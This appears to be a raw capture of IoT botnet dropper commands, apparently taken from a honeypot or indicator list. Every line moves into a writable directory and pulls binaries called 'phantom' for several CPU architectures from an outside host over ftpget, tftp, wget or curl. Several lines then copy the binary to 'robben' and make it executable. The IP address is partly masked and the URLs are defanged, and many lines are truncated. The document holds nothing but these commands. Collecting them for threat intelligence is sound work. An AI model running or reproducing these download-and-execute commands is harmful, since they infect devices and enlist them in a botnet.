cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 91.92.42.XXX phantom.ar
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 91.92.42.XXX phantom.mi
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 91.92.42.XXX phantom.mp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 91.92.42.XXX phantom.x8
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r phantom.mips -g 91.92.42.XXX;cat phantom.mips >robben;chm
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r phantom.mpsl -g 91.92.42.XXX;cat phantom.mpsl >robben;chm
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r phantom.x86 -g 91.92.42.XXX;cat phantom.x86 >robben;chmod
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 91.92.42.XXX -c get phantom.arm4;cat phantom.arm4 >robben;ch
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 91.92.42.XXX -c get phantom.mips;cat phantom.mips >robben;ch
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 91.92.42.XXX -c get phantom.mpsl;cat phantom.mpsl >robben;ch
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 91.92.42.XXX -c get phantom.x86;cat phantom.x86 >robben;chmo
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://91.92.42.XXX/bins/phantom.arm4; curl -O hxxp://91[.]92[.]
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://91.92.42.XXX/bins/phantom.mips; curl -O hxxp://91[.]92[.]
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://91.92.42.XXX/bins/phantom.mpsl; curl -O hxxp://91[.]92[.]
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://91.92.42.XXX/bins/phantom.x86; curl -O hxxp://91[.]92[.]4
cp /bin/busybox /tmp/
